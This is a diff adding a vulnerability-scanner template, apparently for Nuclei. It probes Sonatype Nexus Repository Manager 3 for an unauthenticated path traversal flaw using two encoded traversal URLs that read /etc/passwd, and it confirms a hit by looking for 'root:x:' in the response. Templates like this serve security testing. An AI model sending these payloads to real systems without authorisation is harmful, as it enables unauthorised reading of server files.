@@ -1,0 +1,35 @@
+id: nexus-anyfile-download
+
+info:
+  name: Nexus Repository Manager 3 任意文件下载
+  author: yuan
+  severity: high
+  description: Sonateype Nexus Repository 3中的路径遍历漏洞允许未经身份验证的攻击者读取远程操作系统上的任意文件。
+  tags: nexus
+
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd'
+      - '{{BaseURL}}/.%2f/..%2f/..%2f/..%2f/..%2f/etc/passwd'
+
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0
+      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+      Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+      Accept-Encoding: gzip, deflate
+      Connection: close
+      Upgrade-Insecure-Requests: 1
+
+    stop-at-first-match: true
+    
+    matchers-condition: and
+    
+    matchers:
+      - type: word
+        words:
+          - "root:x:"
+        part: body
+      - type: status
+        status:
+          - 200
